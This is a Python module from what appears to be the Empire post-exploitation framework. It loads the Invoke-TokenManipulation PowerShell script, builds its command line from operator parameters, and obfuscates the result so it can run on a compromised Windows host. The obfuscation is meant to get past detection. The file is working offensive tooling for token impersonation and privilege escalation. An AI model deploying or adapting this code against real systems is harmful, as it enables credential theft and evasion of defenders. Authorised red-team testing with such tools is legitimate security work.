from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-TokenManipulation.ps1"
        if main_menu.obfuscate:
            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
            if pathlib.Path(obfuscated_module_source).is_file():
                module_source = obfuscated_module_source

        try:
            with open(module_source, 'r') as f:
                module_code = f.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
                                         obfuscationCommand=main_menu.obfuscateCommand)
        else:
            script = module_code

        script_end = "Invoke-TokenManipulation"

        outputf = params.get("OutputFunction", "Out-String")

        if params['RevToSelf'].lower() == "true":
            script_end += " -RevToSelf"
        elif params['WhoAmI'].lower() == "true":
            script_end += " -WhoAmI"
        elif params['ShowAll'].lower() == "true":
            script_end += " -ShowAll"
            script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'
        else:
            for option, values in params.items():
                if option.lower() != "agent" and option.lower() != "outputfunction":
                    if values and values != '':
                        if values.lower() == "true":
                            # if we're just adding a switch
                            script_end += " -" + str(option)
                        else:
                            script_end += " -" + str(option) + " " + str(values)

            # try to make the output look nice
            if script.endswith("Invoke-TokenManipulation") or script.endswith("-ShowAll"):
                script_end += "| Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize"
                script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'
            else:
                script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'
                if params['RevToSelf'].lower() != "true":
                    script_end += ';"`nUse credentials/tokens with RevToSelf option to revert token privileges"'

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
